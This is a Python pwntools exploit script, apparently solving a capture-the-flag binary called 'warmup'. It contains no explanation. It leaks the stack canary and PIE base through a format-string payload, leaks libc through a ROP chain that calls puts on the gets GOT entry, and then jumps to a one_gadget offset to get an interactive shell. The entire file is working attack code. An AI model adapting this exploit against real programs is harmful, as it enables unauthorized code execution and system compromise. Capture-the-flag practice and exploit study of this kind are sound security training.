from pwn import *

 

context.log_level = "debug"

 

# p = remote("chall.nitdgplug.org","30091")

p = process("./warmup")

e = ELF("./warmup")

l = ELF("./libc.so.6")

 

payload = "AAAAAAAA%20$p%23$p"

p.sendlineafter(b"Can you help find the Canary ?", payload)

 

p.recvline()

data = p.recvline().strip()[8:]

PIE = int(data[:14], 16)

canary = int(data[14:], 16)

PIE_base = PIE - e.symbols["__libc_csu_init"]

pop_rdi_ret = PIE_base + 0x0000000000001343

 

print("[*] canary: " + hex(canary))

print("[*] PIE_base: " + hex(PIE_base))

 

payload = b"AAAAAAAA" * 9 

payload += p64(canary)

payload += b"AAAAAAAA"

payload += p64(pop_rdi_ret)

payload += p64(PIE_base + e.got["gets"])

payload += p64(PIE_base + e.plt["puts"])

payload += p64(PIE_base + e.symbols["main"])

 

p.sendline(payload)

 

p.recvline()

libc = u64(p.recvline().strip() + b"\x00\x00")

libc_base = libc - l.symbols["gets"]

print("[!] libc_base: "+hex(libc_base))

 

p.sendlineafter(b"Can you help find the Canary ?", "A")

payload = b"AAAAAAAA" * 9 

payload += p64(canary)

payload += b"AAAAAAAA"

payload += p64(libc_base + 0xe3b31) # 0xe3b31 0xe3b34

 

p.sendline(payload)

 

p.interactive()